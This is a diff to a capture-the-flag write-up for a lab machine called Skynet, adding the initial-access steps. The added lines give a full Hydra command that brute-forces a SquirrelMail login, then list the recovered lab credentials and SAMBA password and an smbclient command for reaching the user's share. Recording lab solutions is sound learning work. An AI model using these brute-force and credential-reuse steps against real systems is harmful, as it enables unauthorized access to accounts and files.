@@ -65,4 +65,11 @@ Service Info: Host: SKYNET; OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ## Initial Access
 
 - Use Hydra to brute force squirrelmail login page
-    - `hydra -l milesdyson -P log1.txt <target ip> http-post-form `
+    - `hydra -l milesdyson -P log1.txt <target ip> http-post-form "/squirrelmail/src/redirect.php:login_username=^USER^&secretkey=^PASS^&js_autodetect_results=1&just_logged_in=1:Unknown"`
+    - Valid credentials found"
+        - milesdyson
+        - cyborg007haloterminator
+- Most recent email mentions SAMBA password reset
+    - *milesdyson* SAMBA password is *)s{A&2Z=F^n_E.B`*
+- `smbclient //<target ip>/milesdyson -U milesdyson`
+- There is one .txt file in *milesdyson*'s share: important.txt
